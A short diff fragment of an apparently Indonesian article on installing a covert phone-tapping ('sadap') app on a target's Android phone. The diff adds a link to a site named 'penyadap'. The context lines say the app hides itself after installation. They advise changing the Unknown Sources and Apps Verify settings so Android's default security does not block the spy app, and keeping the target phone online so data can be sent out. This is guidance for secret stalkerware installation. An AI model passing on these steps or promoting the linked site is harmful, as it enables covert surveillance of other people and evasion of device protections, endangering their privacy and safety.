@@ -586,3 +586,5 @@ Setelah proses pemasangan berhasil maka aplikasi akan tersembunyi pada tampilan 
 Tidak ada yang perbahan pada settingan yang mencurigakan, untuk pemasangan sadap mungkin membutuhkan settingan pada Unknowm Source / Sumber tidak dikenal dan Apps Verify (agar aplikasi jenis spy tidak terblokir dengan keamanan default Android). 
 
 Pastikan juga HP target selalu terhubung dengan internet karena aplikasi sadap bekerja dengan koneksi internet untuk mengirim dan menerima data.
+
+- penyadap.pages.dev
